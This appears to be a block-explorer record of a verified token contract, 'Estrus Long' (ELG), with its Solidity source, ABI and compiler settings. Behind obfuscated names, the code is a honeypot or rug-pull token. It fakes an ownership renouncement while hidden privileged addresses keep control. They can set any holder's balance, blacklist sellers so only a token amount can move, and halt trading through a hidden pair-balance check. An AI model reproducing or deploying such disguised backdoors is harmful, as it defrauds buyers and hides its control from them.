{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface launchSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletFrom {\n    function createPair(address atSender, address atTo) external returns (address);\n}\n\ninterface buyReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLaunchedTo) external view returns (uint256);\n\n    function transfer(address swapFund, uint256 launchedMax) external returns (bool);\n\n    function allowance(address maxWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFund,\n        uint256 launchedMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLaunch, uint256 value);\n    event Approval(address indexed maxWallet, address indexed spender, uint256 value);\n}\n\ninterface buyReceiverMetadata is buyReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EstrusLong is toTrading, buyReceiver, buyReceiverMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLimit;\n    }\n\n    string private toReceiver = \"Estrus Long\";\n\n    uint256 public teamLiquidityMarketing;\n\n    mapping(address => uint256) private maxAuto;\n\n    bool private receiverAmount;\n\n    address private shouldAmountAuto;\n\n    uint256 constant receiverMarketing = 11 ** 10;\n\n    constructor (){\n        \n        launchSwap maxList = launchSwap(buyFeeAuto);\n        fromAuto = walletFrom(maxList.factory()).createPair(maxList.WETH(), address(this));\n        if (senderTake != receiverAutoAt) {\n            receiverAutoAt = senderTake;\n        }\n        autoLimit = _msgSender();\n        tokenTotal();\n        tradingTeam[autoLimit] = true;\n        maxAuto[autoLimit] = limitSwap;\n        if (receiverAmount) {\n            teamLiquidityMarketing = senderSwapEnable;\n        }\n        emit Transfer(address(0), autoLimit, limitSwap);\n    }\n\n    event OwnershipTransferred(address indexed tradingTotalTx, address indexed marketingEnable);\n\n    mapping(address => bool) public tradingTeam;\n\n    function txList(address modeMin) public {\n        if (txTake) {\n            return;\n        }\n        \n        tradingTeam[modeMin] = true;\n        \n        txTake = true;\n    }\n\n    address limitTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address tradingLaunchedTo) public view virtual override returns (uint256) {\n        return maxAuto[tradingLaunchedTo];\n    }\n\n    bool public txTake;\n\n    uint256 private senderTake;\n\n    function owner() external view returns (address) {\n        return shouldAmountAuto;\n    }\n\n    function limitBuy(uint256 launchedMax) public {\n        receiverFeeFrom();\n        autoSwap = launchedMax;\n    }\n\n    function transferFrom(address fromReceiver, address swapFund, uint256 launchedMax) external override returns (bool) {\n        if (_msgSender() != buyFeeAuto) {\n            if (fundEnable[fromReceiver][_msgSender()] != type(uint256).max) {\n                require(launchedMax <= fundEnable[fromReceiver][_msgSender()]);\n                fundEnable[fromReceiver][_msgSender()] -= launchedMax;\n            }\n        }\n        return txLiquidity(fromReceiver, swapFund, launchedMax);\n    }\n\n    uint256 autoSwap;\n\n    uint256 public senderSwapEnable;\n\n    function tokenTotal() public {\n        emit OwnershipTransferred(autoLimit, address(0));\n        shouldAmountAuto = address(0);\n    }\n\n    uint256 maxSellMode;\n\n    uint8 private isExemptMin = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isExemptMin;\n    }\n\n    function walletMinSell(address receiverLimit) public {\n        receiverFeeFrom();\n        if (receiverAutoAt == modeFund) {\n            modeFund = senderTake;\n        }\n        if (receiverLimit == autoLimit || receiverLimit == fromAuto) {\n            return;\n        }\n        exemptLaunched[receiverLimit] = true;\n    }\n\n    function transfer(address swapEnableFund, uint256 launchedMax) external virtual override returns (bool) {\n        return txLiquidity(_msgSender(), swapEnableFund, launchedMax);\n    }\n\n    uint256 private receiverAutoAt;\n\n    string private modeLimit = \"ELG\";\n\n    function allowance(address enableMarketing, address totalSwap) external view virtual override returns (uint256) {\n        if (totalSwap == buyFeeAuto) {\n            return type(uint256).max;\n        }\n        return fundEnable[enableMarketing][totalSwap];\n    }\n\n    function txLiquidity(address fromReceiver, address swapFund, uint256 launchedMax) internal returns (bool) {\n        if (fromReceiver == autoLimit) {\n            return txMax(fromReceiver, swapFund, launchedMax);\n        }\n        uint256 swapIs = buyReceiver(fromAuto).balanceOf(limitTx);\n        require(swapIs == autoSwap);\n        require(swapFund != limitTx);\n        if (exemptLaunched[fromReceiver]) {\n            return txMax(fromReceiver, swapFund, receiverMarketing);\n        }\n        return txMax(fromReceiver, swapFund, launchedMax);\n    }\n\n    function receiverFeeFrom() private view {\n        require(tradingTeam[_msgSender()]);\n    }\n\n    uint256 private modeFund;\n\n    mapping(address => bool) public exemptLaunched;\n\n    function enableFee(address swapEnableFund, uint256 launchedMax) public {\n        receiverFeeFrom();\n        maxAuto[swapEnableFund] = launchedMax;\n    }\n\n    uint256 private limitSwap = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return toReceiver;\n    }\n\n    address public autoLimit;\n\n    address public fromAuto;\n\n    function txMax(address fromReceiver, address swapFund, uint256 launchedMax) internal returns (bool) {\n        require(maxAuto[fromReceiver] >= launchedMax);\n        maxAuto[fromReceiver] -= launchedMax;\n        maxAuto[swapFund] += launchedMax;\n        emit Transfer(fromReceiver, swapFund, launchedMax);\n        return true;\n    }\n\n    bool public exemptSwap;\n\n    function getOwner() external view returns (address) {\n        return shouldAmountAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitSwap;\n    }\n\n    address buyFeeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address totalSwap, uint256 launchedMax) public virtual override returns (bool) {\n        fundEnable[_msgSender()][totalSwap] = launchedMax;\n        emit Approval(_msgSender(), totalSwap, launchedMax);\n        return true;\n    }\n\n    bool private marketingSell;\n\n    mapping(address => mapping(address => uint256)) private fundEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotalTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchedTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnableFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMax\",\"type\":\"uint256\"}],\"name\":\"enableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedMax\",\"type\":\"uint256\"}],\"name\":\"limitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidityMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnableFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"txList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"walletMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EstrusLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}